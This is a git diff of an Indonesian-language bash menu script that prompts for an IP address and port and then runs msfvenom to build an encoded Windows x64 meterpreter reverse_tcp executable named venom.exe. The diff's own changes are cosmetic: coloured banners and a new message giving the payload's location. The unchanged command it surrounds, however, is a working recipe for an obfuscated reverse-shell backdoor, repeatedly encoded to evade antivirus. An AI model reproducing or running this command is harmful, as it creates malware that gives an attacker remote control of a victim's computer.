@@ -251,12 +251,13 @@ echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
 read -p"╰─>> " lhost
 echo "╭─[Masukan PORT]" | lolcat
 read -p"╰─>> " lport
-echo "##################################################################################"
-echo "[!]MOHON TUNGGU SAMPAI SELESAI!" | lolcat
-echo "##################################################################################"
+echo "##################################################################################" | lolcat
+echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
+echo "##################################################################################" | lolcat
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
 echo "##################################################################################" | lolcat
-echo "[!]FINISH..." | lolcat
+echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
+echo "[!]CHECK PAYLOAD AT FOLDER Tools/venom.exe" | lolcat
 echo "##################################################################################" | lolcat
 echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
 read -p"╰─>> " back
